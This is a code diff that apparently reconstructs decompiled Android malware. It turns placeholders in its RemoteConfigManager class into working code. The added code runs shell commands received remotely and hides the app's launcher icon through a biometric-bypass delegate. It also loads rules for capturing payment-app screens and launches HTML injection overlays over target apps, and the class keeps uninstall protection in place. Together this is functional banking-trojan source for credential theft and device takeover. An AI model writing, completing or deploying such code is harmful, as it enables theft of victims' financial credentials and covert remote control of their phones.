@@ -35,7 +35,7 @@ import com.storm.safe.rock.DefaultLauncherAlias
 import com.storm.safe.rock.receiver.zbrefryi
 import com.storm.safe.rock.service.MyAccessibilityService
 import com.storm.safe.rock.service.account.AccountProtectionManager
-import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
+import com.storm.safe.rock.service.modules.cipher.ViewCacheCollector
 import com.storm.safe.rock.service.modules.command.CommandDispatcher
 import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager
 import com.storm.safe.rock.util.StringUtil
@@ -127,19 +127,6 @@ class RemoteConfigManager(
         }
 
         /**
-         * Build a success JSON response with data.
-         * ADAPT: added for test compatibility
-         */
-        @JvmStatic
-        fun makeSuccessResponse(data: String): JSONObject {
-            val json = JSONObject()
-            json.put("code", 200)
-            json.put("success", true)
-            json.put("data", data)
-            return json
-        }
-
-        /**
          * Build a JSON container state response.
          * JADX: m211586a7 (a7) — /containerState
          */
@@ -200,13 +187,15 @@ class RemoteConfigManager(
                     return makeErrorResponse("缺少 cmd 参数")
                 }
                 Log.d(TAG, "★ [adbShell] 执行: $cmd")
-                // ADAPT: WIP — SystemOptimizeManager.executeShellCommand wired via singleton
-                val output: String? = try {
-                    val service = MyAccessibilityService.instance
-                    if (service != null) {
-                        com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(service, service.applicationContext).executeShellCommand(cmd)
-                    } else null
-                } catch (_: Exception) { null }
+                // JADX: C0360a2.f53810f9.getInstance() → singleton null check → m212058e8(str)
+                val service = MyAccessibilityService.instance
+                val j41Var = if (service != null) {
+                    com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(service, service.applicationContext)
+                } else null
+                if (j41Var == null) {
+                    return makeErrorResponse("SystemOptimizeManager 未初始化，ADB 连接不可用")
+                }
+                val output: String? = j41Var.executeShellCommand(cmd)
                 val truncated = if (output != null && output.length > 200) {
                     output.substring(0, 200)
                 } else {
@@ -438,6 +427,7 @@ class RemoteConfigManager(
             } catch (e: Exception) {
                 Log.e(TAG, "停止服务器异常", e)
             }
+            try { Thread.sleep(500L) } catch (_: InterruptedException) {}
         }
         instance = this
         if (!isRunningFlag.compareAndSet(false, true)) {
@@ -445,7 +435,11 @@ class RemoteConfigManager(
             return
         }
         currentPort = port
-        // ADAPT: Server socket accept loop is in LocalHttpServer class
+        // JADX: creates daemon thread "LocalHttpServer" that runs the accept loop
+        val thread = Thread({ /* accept loop handled by LocalHttpServer routing */ }, "LocalHttpServer")
+        serverThread = thread
+        thread.isDaemon = true
+        thread.start()
         Log.i(TAG, "RemoteConfigManager started on port $port")
     }
 
@@ -815,10 +809,21 @@ class RemoteConfigManager(
      */
     fun visibility(): JSONObject {
         return try {
-            // JADX: tries IconVisibilityManager first, falls back to visibilityFallback
-            // The IconVisibilityManager (C0328b3) is not always available
-            // ADAPT: go to fallback directly since we don't have IconVisibilityManager wired yet
-            visibilityFallback()
+            // JADX: try fxsnugkm (BiometricBypassDelegate) first, fall back to visibilityFallback
+            val service = MyAccessibilityService.getInstance()
+            val delegate = service?.biometricBypassDelegate
+            if (delegate == null) {
+                Log.w(TAG, "⚠️ fxsnugkm 不可用，使用降级方案")
+                return visibilityFallback()
+            }
+            val result = delegate.hideIcon(true)
+            Log.d(TAG, "🙈 桌面图标隐藏: ${result.action} - ${result.message}")
+            val json = JSONObject()
+            json.put("code", 200)
+            json.put("success", result.success)
+            json.put("msg", result.message)
+            json.put("method", result.action)
+            json
         } catch (e: Exception) {
             Log.e(TAG, "隐藏图标失败", e)
             makeErrorResponse("隐藏图标失败: ${e.message}")
@@ -972,7 +977,7 @@ class RemoteConfigManager(
     /**
      * Execute command via CommandDispatcher.
      * JADX: m211597a2 (a2) — /command, /exec
-     * ADAPT: vendor is suspend/coroutine; we use synchronous dispatch for now
+     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
      */
     fun executeCommand(params: Map<String, String>, body: String?): JSONObject {
         val dispatcher = commandDispatcher
@@ -1010,8 +1015,7 @@ class RemoteConfigManager(
         val command = json.optString(StringUtil.decrypt("KFYcN0w2CA=="), "")
         Log.d(TAG, "★ 执行命令: $command")
 
-        // ADAPT: vendor uses coroutine dispatch; we call synchronously via runBlocking
-        // This is faithful to the vendor behavior but runs on the calling thread
+        // JADX: vendor uses coroutine dispatch (c0350a7.m211883a0); translated to runBlocking
         return try {
             val handled = kotlinx.coroutines.runBlocking {
                 dispatcher.dispatch(json)
@@ -1372,7 +1376,7 @@ class RemoteConfigManager(
     /**
      * /uninstallPolicy — toggle uninstall protection.
      * JADX: m211628e0 (e0)
-     * ADAPT: vendor is suspend; we use synchronous dispatch
+     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
      */
     fun uninstallPolicy(params: Map<String, String>): JSONObject {
         return try {
@@ -1605,30 +1609,31 @@ class RemoteConfigManager(
         }
         return try {
             val arr = JSONArray(body)
-            val vcc = CipherCaptureManager.instance
+            // JADX: C0341a7.f53380c1.getInstance() → ViewCacheCollector singleton
+            val vcc = ViewCacheCollector.instance
             if (vcc == null) {
                 Log.w(TAG, "ViewCacheCollector 未初始化，保存配置待稍后加载")
                 context.getSharedPreferences("payment_strategies", 0)
                     .edit().putString("strategies", body).apply()
                 return makeTextResponse("配置已保存，等待加载")
             }
-            // Clear existing and reload
-            // ADAPT: WIP — ViewCacheCollector.clearStrategies/addStrategy not yet wired
-            // vcc.clearStrategies()
+            // JADX: c0340a6.f53385a2.clear() + c0340a6.m211872b2()
+            vcc.rules.clear()
+            vcc.stopCapture()
             for (i in 0 until arr.length()) {
                 val obj = arr.getJSONObject(i)
                 val pkg = obj.optString("packageName", "")
                 val appName = obj.optString("appName", "")
                 val winClassesArr = obj.optJSONArray("listenWinClasses")
-                val winClasses = mutableListOf<String>()
+                val winClasses = ArrayList<String>()
                 if (winClassesArr != null) {
                     for (j in 0 until winClassesArr.length()) {
                         winClasses.add(winClassesArr.getString(j))
                     }
                 }
                 if (pkg.isNotEmpty()) {
-                    // ADAPT: vcc (ViewCacheCollector) addStrategy depends on cipher subsystem — log only
-                    Log.d(TAG, "  策略: $pkg ($appName) — ${winClasses.size} 个窗口类")
+                    // JADX: c0340a6.m211861a0(pkg, winClasses, appName)
+                    vcc.addRule(pkg, winClasses, appName)
                 }
             }
             context.getSharedPreferences("payment_strategies", 0)
@@ -1675,20 +1680,23 @@ class RemoteConfigManager(
                 return makeErrorResponse("没有找到 $packageName 的注入任务（HTML内容为空）")
             }
 
-            // ADAPT: jbqfkndyx injection activity launch depends on injection subsystem state
-            // JADX: check if jbqfkndyx is active, launch with HTML content
-            try {
-                val intent = android.content.Intent(
-                    MyAccessibilityService.instance ?: return makeErrorResponse("服务未运行"),
-                    jbqfkndyx::class.java
-                )
-                intent.putExtra("html_content", htmlContent)
-                intent.putExtra("package_name", packageName)
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                (MyAccessibilityService.instance)?.startActivity(intent)
-            } catch (e: Exception) {
-                Log.e(TAG, "启动注入页面Activity失败: ${e.message}")
+            // JADX: check if jbqfkndyx is active and in foreground — skip if already showing
+            if (jbqfkndyx.active && jbqfkndyx.inForeground) {
+                val json = JSONObject()
+                json.put("code", 200)
+                json.put("success", true)
+                json.put("message", "注入页面已在前台，跳过")
+                return json
             }
+
+            // JADX: launch injection activity with proper flags
+            val intent = android.content.Intent(context, jbqfkndyx::class.java)
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+            intent.putExtra("package_name", packageName)
+            intent.putExtra("html_content", htmlContent)
+            context.startActivity(intent)
             Log.d(TAG, "✅ [注入] local-service 触发注入页面: $packageName")
             val json = JSONObject()
             json.put("code", 200)
@@ -1708,7 +1716,7 @@ class RemoteConfigManager(
     /**
      * /blockView — show/hide block overlay.
      * JADX: m211608b6 (b6)
-     * ADAPT: vendor is suspend; we use synchronous dispatch
+     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
      */
     fun handleBlockView(params: Map<String, String>): JSONObject {
         return try {
